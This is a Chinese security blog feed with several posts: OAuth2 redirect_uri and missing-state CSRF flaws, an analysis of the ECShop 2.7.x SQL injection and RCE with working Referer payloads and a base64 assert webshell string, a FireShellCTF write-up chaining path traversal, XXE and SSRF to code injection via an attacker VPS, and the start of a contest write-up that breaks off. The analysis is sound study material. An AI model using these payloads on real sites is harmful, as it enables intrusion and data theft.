    <content type="html"><![CDATA[<h1 id="Oauth2的两类漏洞挖掘"><a href="#Oauth2的两类漏洞挖掘" class="headerlink" title="Oauth2的两类漏洞挖掘"></a>Oauth2的两类漏洞挖掘</h1><p>一直忘了总结这个，结合OPPX的网站(无漏洞站点)说明一下</p><h2 id="redict-uri限制不严格-Oauth配置错误"><a href="#redict-uri限制不严格-Oauth配置错误" class="headerlink" title="redict_uri限制不严格(Oauth配置错误)"></a>redict_uri限制不严格(Oauth配置错误)</h2><h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>一般登陆选项是这样，常见的是QQ/微信/微博/…授权登陆<br><img src="https://i.loli.net/2019/02/14/5c64d712383f4.png" alt></p><p>点击QQ授权的时候请求包和返回包如下<br><img src="https://i.loli.net/2019/02/14/5c64d71326e9b.png" alt></p><p>request:</p><pre><code>POST /oauth2.0/authorize HTTP/1.1Host: graph.qq.comresponse_type=code&amp;client_id=100498628&amp;redirect_uri=https%3A%2F%2Fmy.oppo.com%2Fauth%2Fqqcallback&amp;scope=get_user_info%2Cadd_share%2Clist_album%2Cadd_album%2Cupload_pic%2Cadd_topic%2Cadd_one_blog%2Cadd_weibo%2Ccheck_page_fans%2Cadd_t%2Cadd_pic_t%2Cdel_t%2Cget_repost_list%2Cget_info%2Cget_other_info%2Cget_fanslist%2Cget_idolist%2Cadd_idol%2Cdel_idol%2Cget_tenpay_addr&amp;state=49085978f5e969063165246c6d07e062&amp;switch=&amp;from_ptlogin=1&amp;src=1&amp;update_auth=1&amp;openapi=80901010&amp;g_tk=1156350624&amp;auth_time=1550070856795&amp;ui=97557FF6-0331-4598-BC09-6CD21B7106E0</code></pre><p>response:</p><pre><code>HTTP/1.1 302 Moved TemporarilyServer: nginxDate: Wed, 13 Feb 2019 15:17:13 GMTContent-Type: text/htmlContent-Length: 0Connection: closeLocation: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE043&amp;state=49085978f5e969063165246c6d07e062</code></pre><p>流程：请求graph.qq.com获得授权，拿到auth code后拼接到redirect_uri再请求，这点可以在返回包中的Location看到。</p><p>漏洞思路就是redict_uri限制不到位，严重的情况是没有限制域，一般情况是redict_uri可以到子域。QQ做了限制，拿cline_id和redirec_uri比对，不相符就返回False，如下<br><img src="https://i.loli.net/2019/02/14/5c64d712c68d7.png" alt></p><h3 id="案例-第三方帐号快捷登录授权劫持漏洞"><a href="#案例-第三方帐号快捷登录授权劫持漏洞" class="headerlink" title="案例-第三方帐号快捷登录授权劫持漏洞"></a>案例-第三方帐号快捷登录授权劫持漏洞</h3><p>修改redirect_uri到子域(一般是论坛站点，可以加载外域图片的地方，或者是可以XSS的地方)。location跳转到子域后访问我们外域地址，referer就携带了code。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>KEY：<a href="https://gh0st.cn/archives/2018-02-12/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-02-12/1</a></p><h2 id="无state导致CSRF产生的账户接管"><a href="#无state导致CSRF产生的账户接管" class="headerlink" title="无state导致CSRF产生的账户接管"></a>无state导致CSRF产生的账户接管</h2><p>用户在第三方网站A上登录后，通过Authorization code方式的绑定流程。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>拿绑定QQ为例子。</p><p>一般在登陆后的个人中心页面有绑定社交用户的功能，依然是请求greph.qq.com获取code，拼接到redirect_uri访问后完成绑定。如果没有state参数，用户在A登陆后进行，点击攻击者的redict_uri+code链接，就把用户A绑定在了攻击者的QQ上。可以看作是CSRF<br><img src="https://i.loli.net/2019/02/14/5c64d712f1b50.png" alt></p><h3 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h3><p>OAuth2.0忽略state参数引发的CSRF漏洞：<a href="https://blog.csdn.net/gjb724332682/article/details/54428808" target="_blank" rel="noopener">https://blog.csdn.net/gjb724332682/article/details/54428808</a></p><p>Oauth配置错误导致的账户接管：<a href="https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Oauth2的两类漏洞挖掘&quot;&gt;&lt;a href=&quot;#Oauth2的两类漏洞挖掘&quot; class=&quot;headerlink&quot; title=&quot;Oauth2的两类漏洞挖掘&quot;&gt;&lt;/a&gt;Oauth2的两类漏洞挖掘&lt;/h1&gt;&lt;p&gt;一直忘了总结这个，结合OPPX的网站(无漏洞站点)说
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Echsop2.7.x几处漏洞分析</title>
    <link href="https://hpdoger.cn/2019/02/02/Echsop2.7.x%E5%87%A0%E5%A4%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/02/02/Echsop2.7.x几处漏洞分析/</id>
    <published>2019-02-01T16:00:00.000Z</published>
    <updated>2019-02-12T07:04:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Echsop2-7-x几处漏洞分析"><a href="#Echsop2-7-x几处漏洞分析" class="headerlink" title="Echsop2.7.x几处漏洞分析"></a>Echsop2.7.x几处漏洞分析</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这些洞是在半年前公布的细节，当时没来得及关注。最近在给自己定目标，决定重新刷一遍这些洞。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>由于未对Reffer内容进行过滤而造成的SQL注入</p><p>漏洞位置user.php:302</p><pre><code>elseif ($action == &#39;login&#39;){    if (empty($back_act))    {        if (empty($back_act) &amp;&amp; isset($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]))        {            $back_act = strpos($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;], &#39;user.php&#39;) ? &#39;./index.php&#39; : $GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;];        }        else        {            $back_act = &#39;user.php&#39;;        }    }    $smarty-&gt;assign(&#39;back_act&#39;, $back_act);    $smarty-&gt;display(&#39;user_passport.dwt&#39;);}</code></pre><p>$back_act可控为Reffer值，跟进assign</p><pre><code>/** * 注册变量 * * @access  public * @param   mix      $tpl_var * @param   mix      $value * * @return  void */function assign($tpl_var, $value = &#39;&#39;){    if (is_array($tpl_var))    {        foreach ($tpl_var AS $key =&gt; $val)        {            if ($key != &#39;&#39;)            {                $this-&gt;_var[$key] = $val;            }        }    }    else    {        if ($tpl_var != &#39;&#39;)        {            $this-&gt;_var[$tpl_var] = $value;        }    }}</code></pre><p>assign()注册了模板变量$this-&gt;_var[‘back_act’]，这里注册的变量在后面的页面模板编译中会用到</p><p>继续跟进user的display函数</p><pre><code>/** * 显示页面函数 * * @access  public * @param   string      $filename * @param   sting      $cache_id * * @return  void */function display($filename, $cache_id = &#39;&#39;){    error_reporting(E_ALL ^ E_NOTICE);    $out = $this-&gt;fetch($filename, $cache_id);    if (strpos($out, $this-&gt;_echash) !== false)    {        $k = explode($this-&gt;_echash, $out);        foreach ($k AS $key =&gt; $val)        {            if (($key % 2) == 1)            {                $k[$key] = $this-&gt;insert_mod($val);            }        }        $out = implode(&#39;&#39;, $k);    }    echo $out;}</code></pre><p>Display中调用fetch函数处理模板文件：user_passport.dwt，跟进关键代码</p><pre><code>/** * 处理模板文件 * * @access  public * @param   string      $filename * @param   sting      $cache_id * * @return  sring */function fetch($filename, $cache_id = &#39;&#39;){    ...    $out = $this-&gt;make_compiled($filename);    ...    return $out; // 返回html数据}</code></pre><p>$filename就是user_passport.dwt，关键内容如下</p><pre><code>&lt;tr&gt;&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;act_login&quot; /&gt;  &lt;input type=&quot;hidden&quot; name=&quot;back_act&quot; value=&quot;{$back_act}&quot; /&gt;  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;{$lang.confirm_login}&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;</code></pre><p>通过make_compiled函数编译模板文件，编译时会把之前注册的模板变量渲染到{$back_act}。$out即为渲染后的html代码块</p><p>继续跟进流程，回到display。$out内容被分割为两部分，分割依据是$this-&gt;_echash，而$this-&gt;_echash参数值固定<br><img src="https://i.loli.net/2019/02/01/5c546878d638b.png" alt></p><pre><code>$k = explode($this-&gt;_echash, $out);foreach ($k AS $key =&gt; $val){    if (($key % 2) == 1)    {        $k[$key] = $this-&gt;insert_mod($val);    }}</code></pre><p>跟进insert_mod</p><pre><code>function insert_mod($name) // 处理动态内容{    list($fun, $para) = explode(&#39;|&#39;, $name);    $para = unserialize($para);    $fun = &#39;insert_&#39; . $fun;    return $fun($para);}</code></pre><p>继续对$out内容以“|”形式分割成$fun、$para，|后的内容进行反序列化，再动态调用$fun函数。至此，函数名$fun可控，函数内容$para可控，找一个以Insert_开头的可利用的函数</p><pre><code>function insert_ads($arr){    static $static_res = NULL;    $time = gmtime();    if (!empty($arr[&#39;num&#39;]) &amp;&amp; $arr[&#39;num&#39;] != 1)    {        $sql  = &#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#39; .                    &#39;p.ad_height, p.position_style, RAND() AS rnd &#39; .                &#39;FROM &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad&#39;) . &#39; AS a &#39;.                &#39;LEFT JOIN &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad_position&#39;) . &#39; AS p ON a.position_id = p.position_id &#39; .                &quot;WHERE enabled = 1 AND start_time &lt;= &#39;&quot; . $time . &quot;&#39; AND end_time &gt;= &#39;&quot; . $time . &quot;&#39; &quot;.                    &quot;AND a.position_id = &#39;&quot; . $arr[&#39;id&#39;] . &quot;&#39; &quot; .                &#39;ORDER BY rnd LIMIT &#39; . $arr[&#39;num&#39;];        $res = $GLOBALS[&#39;db&#39;]-&gt;GetAll($sql);    }</code></pre><p>触发SQL注入，构造的PAYLOAD形式：</p><pre><code>echash+ads|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))</code></pre><p>创宇提供的一个payload示例如下：</p><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></pre><p>采用limit注入，利用procedure analyse函数。具体见P师傅文章：<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p><h1 id="RCE分析"><a href="#RCE分析" class="headerlink" title="RCE分析"></a>RCE分析</h1><p>RCE利用点还是insert_ads函数，参数的处理流程很大一部分是上文SQL注入的流程，这里分析3.x版本的RCE</p><p>继续跟进ads函数，重点部分代码如下：</p><pre><code>function insert_ads($arr){    foreach ($res AS $row)    {        if ($row[&#39;position_id&#39;] != $arr[&#39;id&#39;])        {            continue;        }        $position_style = $row[&#39;position_style&#39;];        ...    }    $position_style = &#39;str:&#39; . $position_style;    $GLOBALS[&#39;smarty&#39;]-&gt;assign(&#39;ads&#39;, $ads);    $val = $GLOBALS[&#39;smarty&#39;]-&gt;fetch($position_style);}</code></pre><p>$res为查询结果，即$row[‘position_id’]可用SQL注入的Union select控制，$arr[‘id’]也可控，当两者相等时$position_style的值就可控为$row[‘position_style’]。接着又调用assgin注册变量、fetch编译模板。再看fetch函数</p><pre><code>/**     * 处理模板文件     *     * @access  public     * @param   string      $filename     * @param   sting      $cache_id     *     * @return  sring     */function fetch($filename, $cache_id = &#39;&#39;){    if (strncmp($filename,&#39;str:&#39;, 4) == 0)    {        $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));    }    else    {         ......</code></pre><p>由于字符串前被拼接了str:，所以进入$this-&gt;_eval函数处理，这也是最终的漏洞触发点，可以eval我们构造的恶意语句。<br><img src="https://i.loli.net/2019/02/01/5c5468790d352.png" alt></p><p>但是再_eval之前经过fetch_str处理字符串，跟进</p><pre><code>    /**     * 处理字符串函数     *     * @access  public     * @param   string     $source     *     * @return  sring     */    function fetch_str($source)    {        if (!defined(&#39;ECS_ADMIN&#39;))        {            $source = $this-&gt;smarty_prefilter_preCompile($source);        }        $source=preg_replace(&quot;/([^a-zA-Z0-9_]{1,1})+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;, &quot;&quot;, $source);        if(preg_match_all(&#39;~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\&quot;\&#39;]?php[\&quot;\&#39;]?)~is&#39;, $source, $sp_match))        {            $sp_match[1] = array_unique($sp_match[1]);            for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)            {                $source = str_replace($sp_match[1][$curr_sp],&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;,$source);            }             for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)            {                 $source= str_replace(&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;, &#39;&lt;?php echo \&#39;&#39;.str_replace(&quot;&#39;&quot;, &quot;\&#39;&quot;, $sp_match[1][$curr_sp]).&#39;\&#39;; ?&gt;&#39;.&quot;\n&quot;, $source);            }         }         return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, $source);    }</code></pre><p>第一个正则会匹配危险的字符串函数，重点在最后一个正则。\\1是替代表达，匹配到的字符串会替代\\1的位置。</p><p>eg:<code>return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, &quot;xxx{abc}xxx&quot;);</code>结果就是<code>return $this-&gt;select(&#39;{abc}&#39;)</code></p><p>跟进select函数</p><pre><code>/** * 处理{}标签 * * @access  public * @param   string      $tag * * @return  sring */function select($tag){    $tag = stripslashes(trim($tag));    if (empty($tag))    {        return &#39;{}&#39;;    }    elseif ($tag{0} == &#39;*&#39; &amp;&amp; substr($tag, -1) == &#39;*&#39;) // 注释部分    {        return &#39;&#39;;    }    elseif ($tag{0} == &#39;$&#39;) // 变量    {//            if(strpos($tag,&quot;&#39;&quot;) || strpos($tag,&quot;]&quot;))//            {//                 return &#39;&#39;;//            }        return &#39;&lt;?php echo &#39; . $this-&gt;get_val(substr($tag, 1)) . &#39;; ?&gt;&#39;;    }    ......</code></pre><p>trim处理了字符串两边的{}，最后返回一段php标签下的字符串，如果成功返回，则之前的eval就可以执行这段php字符串。不过这个值的获取取决于get_val，跟进get_val</p><pre><code>/** * 处理smarty标签中的变量标签 * * @access  public * @param   string     $val * * @return  bool */function get_val($val){    if (strrpos($val, &#39;[&#39;) !== false)    {        $val = preg_replace(&quot;/\[([^\[\]]*)\]/eis&quot;, &quot;&#39;.&#39;.str_replace(&#39;$&#39;,&#39;\$&#39;,&#39;\\1&#39;)&quot;, $val);    }    if (strrpos($val, &#39;|&#39;) !== false)    {        $moddb = explode(&#39;|&#39;, $val);        $val = array_shift($moddb);    }    if (empty($val))    {        return &#39;&#39;;    }    if (strpos($val, &#39;.$&#39;) !== false)    {        $all = explode(&#39;.$&#39;, $val);        foreach ($all AS $key =&gt; $val)        {            $all[$key] = $key == 0 ? $this-&gt;make_var($val) : &#39;[&#39;. $this-&gt;make_var($val) . &#39;]&#39;;        }        $p = implode(&#39;&#39;, $all);    }    else    {        $p = $this-&gt;make_var($val);    }</code></pre><p>若$val不存在<code>.$</code>则进入make_var()</p><pre><code>/** * 处理去掉$的字符串 * * @access  public * @param   string     $val * * @return  bool */function make_var($val){    if (strrpos($val, &#39;.&#39;) === false)    {        if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val]))        {            $val = $this-&gt;_patchstack[$val];        }        $p = &#39;$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]&#39;;    }    else    {       .....</code></pre><p>这个make_var的$val可控，则表明返回的$p可控，最终返回的$this-&gt;get_val()就可控，也就是$this-&gt;_eval的实参可控（一段PHP标签下的字符串），从而getshell。</p><p>构造Payload我用逆推的思路，逐步满足每个函数判断的条件<br><img src="https://i.loli.net/2019/02/02/5c54fa8f5fb8b.png" alt></p><p>最终的POC要结合SQL注入，通过id和num参数将order by注释<br><img src="https://i.loli.net/2019/02/02/5c54fa8f75fb6.png" alt></p><p>再利用union select构造指定列的值：第二列postion_id，第七列position_style<br><img src="https://images.seebug.org/content/images/2018/09/cd7f6796-c175-46c0-a7c4-9cdb480ab960.png-w331s" alt></p><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></pre><p>id的值就是<code>&#39; /*</code>，num的值<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，0x27202f2a是<code>&#39; /*</code>的16进制值，也就是第二列<code>$row[&#39;position_id&#39;]</code>的值<code>。0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>为<code>{$&#39;];phpinfo/**/();//}</code>的16进制值</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>看到ecshop4/ecshop/includes/lib_insert.php<br><img src="https://images.seebug.org/content/images/2018/09/d542c73a-d3ef-4e89-8394-aa85c7f1332e.png-w331s" alt></p><p>对id和num进行强制类型转换了，字符串无法利用</p><h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>创宇WAF拦截的Payload是这样</p><pre><code>{$abc&#39;];assert(base64_decode(&#39;YXNzZXJ0KCRfR0VUWyd4J10pOw==&#39;));//}</code></pre><p>巧妙解决了$_GET[]的[]问题，测试用法</p><p><img src="https://i.loli.net/2019/02/02/5c55aa16d0c98.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://paper.seebug.org/695/#_5" target="_blank" rel="noopener">https://paper.seebug.org/695/#_5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Echsop2-7-x几处漏洞分析&quot;&gt;&lt;a href=&quot;#Echsop2-7-x几处漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;Echsop2.7.x几处漏洞分析&quot;&gt;&lt;/a&gt;Echsop2.7.x几处漏洞分析&lt;/h1&gt;&lt;h1 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>FireShellCTF2019 Bad Injections解题记录</title>
    <link href="https://hpdoger.cn/2019/01/30/FireShellCTF2019%20Bad%20Injections%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hpdoger.cn/2019/01/30/FireShellCTF2019 Bad Injections解题记录/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2019-01-30T15:07:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p><p>题目名称：Bad Injections</p><p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p><p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p><p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p><p>给个本地web目录</p><p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p><p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p><pre><code>68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</code></pre><p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p><p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p><p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p><p>down一下download的源码，顺便fuzz一下Controllers的文件</p><pre><code>68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</code></pre><p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p><p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p><p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p><pre><code>68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</code></pre><p>/app/index.php</p><pre><code>&lt;?phpini_set(&#39;display_errors&#39;,1);ini_set(&#39;display_startup_erros&#39;,1);error_reporting(E_ALL);require_once(&#39;Routes.php&#39;);function __autoload($class_name){  if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){    require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;;  }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){    require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;;  }}</code></pre><p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p><pre><code>&lt;?phpRoute::set(&#39;index.php&#39;,function(){  Index::createView(&#39;Index&#39;);});Route::set(&#39;index&#39;,function(){  Index::createView(&#39;Index&#39;);});Route::set(&#39;about-us&#39;,function(){  AboutUs::createView(&#39;AboutUs&#39;);});Route::set(&#39;contact-us&#39;,function(){  ContactUs::createView(&#39;ContactUs&#39;);});Route::set(&#39;list&#39;,function(){  ContactUs::createView(&#39;Lista&#39;);});Route::set(&#39;verify&#39;,function(){     if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){    Verify::createView(&#39;Verify&#39;);  }else{    Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]);  //设置session，file和hash对应请求文件  }});Route::set(&#39;download&#39;,function(){  if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){    echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);  }else{    echo &#39;jdas&#39;;  }});Route::set(&#39;verify/download&#39;,function(){  Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);});Route::set(&#39;custom&#39;,function(){  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);  $data = stream_get_contents($handler); // xml  if(strlen($data) &gt; 1){    Custom::Test($data);  }else{    Custom::createView(&#39;Custom&#39;);  }});Route::set(&#39;admin&#39;,function(){  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){    Admin::createView(&#39;Admin&#39;);  }else{    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);    }else{     echo &quot;;(&quot;;    }  }});Route::set(&#39;custom/sort&#39;,function(){  Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);});Route::set(&#39;index&#39;,function(){ Index::createView(&#39;Index&#39;);});</code></pre><p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p><pre><code>Route::set(&#39;admin&#39;,function(){  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){    Admin::createView(&#39;Admin&#39;);  }else{    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);    }else{     echo &quot;;(&quot;;    }  }});</code></pre><p>找一下其他利用，再看Custom</p><pre><code>Route::set(&#39;custom&#39;,function(){  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);  $data = stream_get_contents($handler);   if(strlen($data) &gt; 1){    Custom::Test($data);  }else{    Custom::createView(&#39;Custom&#39;);  }});</code></pre><p>Custom::Test</p><pre><code>class Custom extends Controller{  public static function Test($string){      $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);      $test = $root-&gt;name;      echo $test;  }}</code></pre><p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p><p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p><p>poc:</p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p><p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p><p><code>http://vps/xxe.txt</code></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;root&gt;&lt;channel&gt;&lt;item&gt;&lt;link&gt;@hpdoger.me&lt;/link&gt;&lt;/item&gt;&lt;item&gt;&lt;link&gt;@souhu.com&lt;/link&gt;&lt;/item&gt;&lt;/channel&gt;&lt;/root&gt;</code></pre><p><code>POC</code></p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FireShellCTF2019-Bad-Injections解题记录&quot;&gt;&lt;a href=&quot;#FireShellCTF2019-Bad-Injections解题记录&quot; class=&quot;headerlink&quot; title=&quot;FireShellCTF2019 Bad I
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯月赛19新年场WriteUp</title>
    <link href="https://hpdoger.cn/2019/01/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9B19%E6%96%B0%E5%B9%B4%E5%9C%BAWriteUp/"/>
    <id>https://hpdoger.cn/2019/01/26/安恒杯月赛19新年场WriteUp/</id>
    <published>2019-01-25T16:00:00.000Z</published>
    <updated>2019-01-26T12:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p><pre><code>&lt;?php  @error_reporting(1); include &#39;flag.php&#39;;class baby {       protected $skyobj;      public $aaa;    public $bbb;    function __construct()     {              $this-&gt;skyobj = new sec;    }      function __toString()          {                  if (isset($this-&gt;skyobj))              return $this-&gt;skyobj-&gt;read();          }  }  class cool {        public $filename;         public $nice;    public $amzing;     function read()          {           $this-&gt;nice = unserialize($this-&gt;amzing);        $this-&gt;nice-&gt;aaa = $sth;        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)        {            $file = 